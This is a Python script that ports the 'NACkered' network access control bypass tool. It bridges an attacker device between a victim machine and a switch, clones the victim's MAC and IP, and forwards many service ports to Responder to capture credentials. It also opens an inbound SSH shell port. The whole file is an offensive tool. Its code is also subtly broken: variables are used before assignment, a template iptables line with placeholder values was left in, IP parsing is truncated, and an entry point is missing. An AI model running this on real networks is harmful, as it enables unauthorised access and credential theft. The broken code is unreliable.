#!/usr/bin/env python3

# Python version
# -----
# Updated Script:
# Name: nacky
# Shazeb - Nacky v1.0
# -----
# Name: nac_bypass_setup.sh
# scip AG - Michael Schneider
# -----
# Original Script:
# Matt E - NACkered v2.92.2 - KPMG LLP 2014
# KPMG UK Cyber Defence Services
# -----

import sys
import os
import subprocess
import time

# Variables
VERSION="1.0"

# Constants
CMD_ARPTABLES = "/usr/sbin/arptables"
CMD_EBTABLES = "/usr/sbin/ebtables"
CMD_IPTABLES = "/usr/sbin/iptables"

# Text color variables - saves retyping these awful ANSI codes
TXTRST = "\033[0m"  # Text reset
SUCC = "\033[1;32m"  # green
INFO = "\033[1;34m"  # blue
WARN = "\033[1;31m"  # red
INP = "\033[1;36m"  # cyan

BRINT = "br0"  # bridge interface
SWINT = "eth0"  # network interface plugged into switch
SWMAC = "00:11:22:33:44:55"  # initial value, is set during initialisation
COMPINT = "eth1"  # network interface plugged into victim machine

BRIP = "169.254.66.66"  # IP address for the bridge
BRGW = "169.254.66.1"  # Gateway IP address for the bridge

TEMP_FILE = "/tmp/tcpdump.pcap"
OPTION_RESPONDER = 0
OPTION_SSH = 0
OPTION_AUTONOMOUS = 0
OPTION_CONNECTION_SETUP_ONLY = 0
OPTION_INITIAL_SETUP_ONLY = 0
OPTION_RESET = 0

# Ports for tcpdump
TCPDUMP_PORT_1 = 88
TCPDUMP_PORT_2 = 445

# Ports for Responder
PORT_UDP_NETBIOS_NS = 137
PORT_UDP_NETBIOS_DS = 138
PORT_UDP_DNS = 53
PORT_UDP_LDAP = 389
PORT_TCP_LDAP = 389
PORT_TCP_SQL = 1433
PORT_UDP_SQL = 1434
PORT_TCP_HTTP = 80
PORT_TCP_HTTPS = 443
PORT_TCP_SMB = 445
PORT_TCP_NETBIOS_SS = 139
PORT_TCP_FTP = 21
PORT_TCP_SMTP1 = 25
PORT_TCP_SMTP2 = 587
PORT_TCP_POP3 = 110
PORT_TCP_IMAP = 143
PORT_TCP_PROXY = 3128
PORT_UDP_MULTICAST = 5553

DPORT_SSH = 50222  # SSH call back port use victimip:50022 to connect to attackerbox:sshport
PORT_SSH = 50022
RANGE = "61000-62000"  # Ports for my traffic on NAT

# Functions
def initial_setup(option_autonomous=0):
    if option_autonomous == 0:
        print("\n[ * ] Starting NAC bypass! Stay tuned...\n")

    if option_autonomous == 0:
        print("\n[ * ] Doing some ground work\n")

    subprocess.run(["systemctl", "stop", "NetworkManager.service"])
    with open("/etc/sysctl.conf", "r") as f:
        sysctl_backup = f.read()
    with open("/etc/sysctl.conf.bak", "w") as f:
        f.write(sysctl_backup)
    with open("/etc/sysctl.conf", "w") as f:
        f.write("net.ipv6.conf.all.disable_ipv6 = 1")
    subprocess.run(["sysctl", "-p"])
    with open("/etc/resolv.conf", "w") as f:
        f.write("")

    subprocess.run(["systemctl", "stop", "ntp"])
    subprocess.run(["timedatectl", "set-ntp", "false"])

    swmac = subprocess.getoutput(f"ifconfig {SWINT} | grep -i ether | awk '{{ print $2 }}'")

    if option_autonomous == 0:
        print("\n[ + ] Ground work done.\n")

    if option_autonomous == 0:
        print("\n[ * ] Starting Bridge configuration\n")

    subprocess.run(["brctl", "addbr", BRINT])
    subprocess.run(["brctl", "addif", BRINT, COMPINT])
    subprocess.run(["brctl", "addif", BRINT, SWINT])

    with open("/sys/class/net/br0/bridge/group_fwd_mask", "w") as f:
        f.write("8")
    with open("/proc/sys/net/bridge/bridge-nf-call-iptables", "w") as f:
        f.write("1")

    subprocess.run(["ifconfig", COMPINT, "0.0.0.0", "up", "promisc"])
    subprocess.run(["ifconfig", SWINT, "0.0.0.0", "up", "promisc"])

    subprocess.run(["macchanger", "-m", "00:12:34:56:78:90", BRINT])
    subprocess.run(["macchanger", "-m", swmac, BRINT])

    subprocess.run(["ifconfig", BRINT, "0.0.0.0", "up", "promisc"])

    if option_autonomous == 0:
        print("\n[ + ] Bridge up, should be dark.\n")
        print("[ # ] Connect Ethernet cables to adapters...")
        print("[ # ] Wait for 30 seconds then press any key...")
        print("[ ! ] Victim machine should work at this point - if not, bad times are coming - run!!")
        sys.stdin.read(1)
    else:
        time.sleep(25)

def connection_setup(option_autonomous, option_ssh, option_responder):
    if option_autonomous == 0:
        print("\n[ * ] Resetting Connection")

    subprocess.run(["mii-tool", "-r", COMPINT])
    subprocess.run(["mii-tool", "-r", SWINT])

    if option_autonomous == 0:
        print("\n[ * ] Listening for Traffic (Kerberos and SMB)")

    # PCAP and look for SYN packets coming from the victim PC to get the source IP, source mac, and gateway MAC
    # TODO: Replace this with tcp SYN OR (udp && not broadcast? need to tell whos source and whos dest)
    # TODO: Replace with actually pulling from the source interface? 
    subprocess.run(["tcpdump", "-i", COMPINT, "-s0", "-w", TEMP_FILE, "-c1", "tcp[13] & 2 != 0"])
    tcpdump_output = subprocess.check_output(["tcpdump", "-r", TEMP_FILE, "-nne", "-c", "1", "tcp"])
    COMPMAC = tcpdump_output.decode().split(',')[1].split(' ')[0]

# Extract GWMAC if not already set
    if not GWMAC:
        GWMAC = tcpdump_output.decode().split(',')[2].split(' ')[0]

    # Extract COMIP
    COMIP = tcpdump_output.decode().split(',')[3].split(' ')[0].split('.')[0]
    if OPTION_AUTONOMOUS == 0:
        print()
        print(f"{INFO} [ * ] Processing packet and setting variables {TXTRST}")
        print(f"{INFO} [ * ] Info: COMPMAC: {COMPMAC}, GWMAC: {GWMAC}, COMIP: {COMIP} {TXTRST}")
        print()
    subprocess.run([CMD_ARPTABLES, "-A", "OUTPUT", "-o", SWINT, "-j", "DROP"])
    subprocess.run([CMD_ARPTABLES, "-A", "OUTPUT", "-o", COMPINT, "-j", "DROP"])
    subprocess.run([CMD_IPTABLES, "-A", "OUTPUT", "-o", COMPINT, "-j", "DROP"])
    subprocess.run([CMD_IPTABLES, "-A", "OUTPUT", "-o", SWINT, "-j", "DROP"])

    if OPTION_AUTONOMOUS == 0:
        print()
        print(f"{INFO} [ * ] Bringing up interface with bridge side IP address, setting up Layer 2 rewrite and default route. {TXTRST}")
        print()

    subprocess.run(["ifconfig", BRINT, BRIP, "up", "promisc"])
    subprocess.run([CMD_EBTABLES, "-t", "nat", "-A", "POSTROUTING", "-s", SWMAC, "-o", SWINT, "-j", "snat", "--to-src", COMPMAC])
    subprocess.run([CMD_EBTABLES, "-t", "nat", "-A", "POSTROUTING", "-s", SWMAC, "-o", BRINT, "-j", "snat", "--to-src", COMPMAC])

    subprocess.run(["arp", "-s", "-i", BRINT, BRGW, GWMAC])
    subprocess.run(["route", "add", "default", "gw", BRGW])
    if OPTION_SSH == 1:
        if OPTION_AUTONOMOUS == 0:
            print("\n[ * ] Setting up SSH reverse shell inbound on {}:{} and start OpenSSH daemon".format(COMIP, DPORT_SSH))

        subprocess.run([CMD_IPTABLES, "-t", "nat", "-A", "PREROUTING", "-i", "br0", "-d", COMIP, "-p", "tcp", "--dport", DPORT_SSH, "-j", "DNAT", "--to", "{}:{}".format(BRIP, PORT_SSH)])

    if OPTION_RESPONDER == 1:
        if OPTION_AUTONOMOUS == 0:
            print("\n[ * ] Setting up all inbound ports for Responder")

        iptables_rules = [
            ('udp', PORT_UDP_NETBIOS_NS),
            ('udp', PORT_UDP_NETBIOS_DS),
            ('udp', PORT_UDP_DNS),
            ('udp', PORT_UDP_LDAP),
            ('tcp', PORT_TCP_LDAP),
            ('tcp', PORT_TCP_SQL),
            ('udp', PORT_UDP_SQL),
            ('tcp', PORT_TCP_HTTP),
            ('tcp', PORT_TCP_HTTPS),
            ('tcp', PORT_TCP_SMB),
            ('tcp', PORT_TCP_NETBIOS_SS),
            ('tcp', PORT_TCP_FTP),
            ('tcp', PORT_TCP_SMTP1),
            ('tcp', PORT_TCP_SMTP2),
            ('tcp', PORT_TCP_POP3),
            ('tcp', PORT_TCP_IMAP),
            ('tcp', PORT_TCP_PROXY),
            ('udp', PORT_UDP_MULTICAST)
        ]

        for protocol, port in iptables_rules:
            subprocess.run([CMD_IPTABLES, "-t", "nat", "-A", "PREROUTING", "-i", "br0", "-d", COMIP, "-p", protocol, "--dport", str(port), "-j", "DNAT", "--to", "{}:{}".format(BRIP, str(port))])

        # Add all the required iptables rules
        # Replace PORT_* variables with the actual port numbers
        # Repeat the line below for each required rule, changing the protocol, dport, and to values as needed
        subprocess.run([CMD_IPTABLES, "-t", "nat", "-A", "PREROUTING", "-i", "br0", "-d", COMIP, "-p", "PROTOCOL", "--dport", "PORT_NUMBER", "-j", "DNAT", "--to", "{}:{}".format(BRIP, "PORT_NUMBER")])
        subprocess.run([CMD_IPTABLES, "-t", "nat", "-A", "POSTROUTING", "-o", BRINT, "-s", BRIP, "-p", "tcp", "-j", "SNAT", "--to", "{}:{}".format(COMIP, RANGE)])
        subprocess.run([CMD_IPTABLES, "-t", "nat", "-A", "POSTROUTING", "-o", BRINT, "-s", BRIP, "-p", "udp", "-j", "SNAT", "--to", "{}:{}".format(COMIP, RANGE)])
        subprocess.run([CMD_IPTABLES, "-t", "nat", "-A", "POSTROUTING", "-o", BRINT, "-s", BRIP, "-p", "icmp", "-j", "SNAT", "--to", COMIP])

        # Start SSH
        if OPTION_SSH == 1:
            subprocess.run(["systemctl", "start", "ssh.service"])
        
        # Finish
        if OPTION_AUTONOMOUS == 0:
            print("\n[ + ] All setup steps complete; check ports are still lit and operational")

        # Re-enabling traffic flow
        subprocess.run([CMD_ARPTABLES, "-D", "OUTPUT", "-o", SWINT, "-j", "DROP"])
        subprocess.run([CMD_ARPTABLES, "-D", "OUTPUT", "-o", COMPINT, "-j", "DROP"])
        subprocess.run([CMD_IPTABLES, "-D", "OUTPUT", "-o", COMPINT, "-j", "DROP"])
        subprocess.run([CMD_IPTABLES, "-D", "OUTPUT", "-o", SWINT, "-j", "DROP"])

        # Housecleaning
        os.remove(TEMP_FILE)

        # All done!
        if OPTION_AUTONOMOUS == 0:
            print("\n[ * ] Time for fun & profit")

def reset():
    if OPTION_AUTONOMOUS == 0:
        print("\n[ * ] Resetting all settings")

    # Bringing bridge down
    subprocess.run(["ifconfig", BRINT, "down"])
    subprocess.run(["brctl", "delbr", BRINT])

    # Delete default route
    subprocess.run(["arp", "-d", "-i", BRINT, BRGW, GWMAC])
    subprocess.run(["route", "del", "default"])

    # Flush EB, ARP- and IPTABLES
    subprocess.run([CMD_EBTABLES, "-F"])
    subprocess.run([CMD_EBTABLES, "-F", "-t", "nat"])
    subprocess.run([CMD_ARPTABLES, "-F"])
    subprocess.run([CMD_IPTABLES, "-F"])
    subprocess.run([CMD_IPTABLES, "-F", "-t", "nat"])

    # Restore sysctl.conf
    os.replace("/etc/sysctl.conf.bak", "/etc/sysctl.conf")
    os.remove("/etc/sysctl.conf.bak")

    if OPTION_AUTONOMOUS == 0:
        print("\n[ + ] All reset steps are completed.")